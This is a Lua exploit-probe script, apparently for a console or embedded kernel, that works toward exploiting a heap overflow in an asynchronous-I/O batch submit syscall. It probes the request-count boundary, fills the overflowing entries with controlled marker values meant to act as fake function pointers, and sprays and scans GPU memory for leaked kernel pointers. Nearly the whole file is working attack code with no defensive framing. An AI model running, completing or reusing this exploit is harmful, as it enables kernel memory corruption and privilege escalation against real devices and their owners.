-- CRASH_CLASS: HIGH
-- PROBE 93d1: AIO batch submit heap overflow exploitation
--
-- Dead ends note: "669(cmd, reqs, count 1..128, class 1..3, ids)"
-- "count not clamped to buffer (0x14000 into 4KB overwrites heap — self-corruption)"
-- This means count values >128 can overflow the kernel's per-request copy buffer.
-- The kernel copies count*stride(0x28) bytes from userland but the buffer may be
-- only one page (4KB = 0x1000). At stride 0x28, 0x1000/0x28 = ~102 entries fit.
-- count=128 gives 128*0x28 = 0x1400 bytes, overflowing by 0x400.
--
-- Strategy: carefully craft the overflow region (entries 103-128) to contain
-- controlled data, then scan GPU pages for kernel pointers after the overflow.
-- Also try count values just above 128 before the kernel clamps.

print("=== PROBE 93d1: AIO BATCH HEAP OVERFLOW ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(32)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- sys 624 baseline
local vm_base = 0
do local ok, rv = pcall(function() return mk(624)() end)
    if ok then vm_base = N(rv) end
end
print("vm_base=" .. vm_base)

-- First: AIO init (670) if needed
pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

-- ========== SECTION A: Probe exact count boundary ==========
print("")
print("--- A: AIO 669 count boundary probing ---")

-- AIO submit: 669(cmd, reqs, count, class, ids)
-- stride = 0x28 per request entry
-- cmd=1 (read), class=1
-- We need valid-ish request entries pointing at real fds

-- Open a /dev/zero fd for read targets
local devzero = memory.alloc(16)
wd(N(devzero), 0x7665642F)  -- /dev
wd(N(devzero)+4, 0x72657A2F)  -- /zer
wd(N(devzero)+8, 0x0000006F)  -- o\0
local ok_z, rv_z = pcall(function() return mk(5)(devzero, uint64(0)) end)
local zero_fd = ok_z and N(rv_z) or -1
print("zero_fd=" .. zero_fd)

-- Build request array: each entry is 0x28 bytes
-- Try count=128 (the maximum that's accepted)
local MAX_COUNT = 128
local req_buf = memory.alloc(MAX_COUNT * 0x28 + 0x100)
local req_a = N(req_buf)
local data_buf = memory.alloc(0x1000)

for i = 0, MAX_COUNT - 1 do
    local base = req_a + i * 0x28
    -- Fill with distinguishable pattern
    wq(base + 0x00, uint64(zero_fd))  -- fd
    wq(base + 0x08, uint64(N(data_buf)))  -- buffer
    wq(base + 0x10, uint64(64))  -- nbytes
    wq(base + 0x18, uint64(i * 64))  -- offset
    wq(base + 0x20, uint64(0))  -- flags/priority
end

-- ids buffer
local ids_buf = memory.alloc(MAX_COUNT * 4 + 0x100)
local ids_a = N(ids_buf)
for i = 0, MAX_COUNT - 1 do
    wd(ids_a + i * 4, 0)
end

-- Test counts from 100 to 135 to find exact boundary
print("Testing count boundary:")
for count = 100, 135 do
    -- Reset ids
    for i = 0, count - 1 do wd(ids_a + i * 4, 0xFFFF) end

    local ok_s, rv_s = pcall(function()
        return mk(669)(uint64(1), uint64(req_a), uint64(count), uint64(1), uint64(ids_a))
    end)

    if not ok_s then
        print(string.format("  count=%d: PCALL_FAIL (crash)", count))
        break
    end

    local ret = N(rv_s)
    if ret >= 0x80000000 then ret = ret - 0x100000000 end

    -- Check ids for non-0xFFFF (assigned ids)
    local assigned = 0
    for i = 0, math.min(count - 1, 10) do
        local id = rd(ids_a + i * 4)
        if id and id ~= 0xFFFF then assigned = assigned + 1 end
    end

    -- Check vm ops delta
    local vm_now = 0
    do local ok_v, rv_v = pcall(function() return mk(624)() end)
        if ok_v then vm_now = N(rv_v) end
    end

    print(string.format("  count=%d: ret=%d assigned=%d vm_delta=%d",
        count, ret, assigned, vm_now - vm_base))

    if not alive() then
        print("  DEAD!")
        break
    end
end

if not alive() then print("Process died during boundary test!"); return end

-- ========== SECTION B: Overflow with controlled data ==========
print("")
print("--- B: Overflow pattern + GPU spray ---")

-- Build request array with distinguishable overflow pattern
-- Entries 0-101 are "normal", entries 102-127 are overflow region
-- Fill overflow region with marker values that could land on adjacent heap objects
local OVF_COUNT = 128
local ovf_req = memory.alloc(OVF_COUNT * 0x28 + 0x100)
local ovf_a = N(ovf_req)

for i = 0, OVF_COUNT - 1 do
    local base = ovf_a + i * 0x28
    if i < 102 then
        -- Normal entries
        wq(base + 0x00, uint64(zero_fd))
        wq(base + 0x08, uint64(N(data_buf)))
        wq(base + 0x10, uint64(64))
        wq(base + 0x18, uint64(0))
        wq(base + 0x20, uint64(0))
    else
        -- Overflow entries: put controlled values
        -- These will overwrite adjacent heap objects
        -- Try to write a pointer-sized value that could serve as a fake function ptr
        wq(base + 0x00, uint64(0x4141414141410000 + i))
        wq(base + 0x08, uint64(0x4242424242420000 + i))
        wq(base + 0x10, uint64(0x4343434343430000 + i))
        wq(base + 0x18, uint64(0x4444444444440000 + i))
        wq(base + 0x20, uint64(0x4545454545450000 + i))
    end
end

local ovf_ids = memory.alloc(OVF_COUNT * 4 + 0x100)

-- Submit with count=128 (the overflow case)
local ok_ovf, rv_ovf = pcall(function()
    return mk(669)(uint64(1), uint64(ovf_a), uint64(128), uint64(1), uint64(N(ovf_ids)))
end)
local ovf_ret = ok_ovf and N(rv_ovf) or -999
print(string.format("669(128) ret=%d", ovf_ret))

if not alive() then print("DEAD after overflow submit!"); return end

-- Now spray GPU pages and scan for our marker values
local gpu_chunks = {}
for gi = 1, 12 do
    local ok_g, rv_g = pcall(function()
        return mk(477)(uint64(0), uint64(64*0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok_g then
        local ga = N(rv_g)
        if ga > 0 then
            gpu_chunks[#gpu_chunks + 1] = ga
        end
    end
end
print(string.format("gpu_chunks=%d", #gpu_chunks))

-- Scan GPU pages for kernel pointers AND our marker values
local kptr_count = 0
local marker_count = 0

for _, ga in ipairs(gpu_chunks) do
    for off = 0, 64*0x4000 - 8, 8 do
        local lo = rd(ga + off) or 0
        local hi = rd(ga + off + 4) or 0
        if lo < 0 then lo = lo + 0x100000000 end
        if hi < 0 then hi = hi + 0x100000000 end

        -- Kernel pointer check
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            kptr_count = kptr_count + 1
            if kptr_count <= 5 then
                print(string.format("  [KPTR!] chunk off=0x%X: 0x%08X%08X", off, hi, lo))
            end
        end

        -- Marker check (our 0x41-0x45 patterns)
        if hi == 0x41414141 or hi == 0x42424242 or hi == 0x43434343
           or hi == 0x44444444 or hi == 0x45454545 then
            marker_count = marker_count + 1
            if marker_count <= 5 then
                print(string.format("  [MARKER!] off=0x%X: 0x%08X%08X", off, hi, lo))
            end
        end
    end
end

print(string.format("kptrs=%d markers=%d", kptr_count, marker_count))

-- Cleanup GPU
for _, ga in ipairs(gpu_chunks) do
    pcall(function() mk(73)(uint64(ga), uint64(64*0x4000)) end)
end

-- Close zero fd
if zero_fd >= 0 then pcall(function() mk(6)(uint64(zero_fd)) end) end

-- ========== SECTION C: Try count=129 (documented as returning -1) ==========
print("")
print("--- C: count=129 boundary check ---")

for count = 129, 140 do
    local ok_c, rv_c = pcall(function()
        return mk(669)(uint64(1), uint64(ovf_a), uint64(count), uint64(1), uint64(N(ovf_ids)))
    end)
    local cret = ok_c and N(rv_c) or -999
    if cret >= 0x80000000 then cret = cret - 0x100000000 end
    print(string.format("  count=%d: ret=%d", count, cret))
    if not alive() then print("  DEAD!"); break end
end

print("")
print("alive=" .. tostring(alive()))
print("=== 93d1 COMPLETE ===")
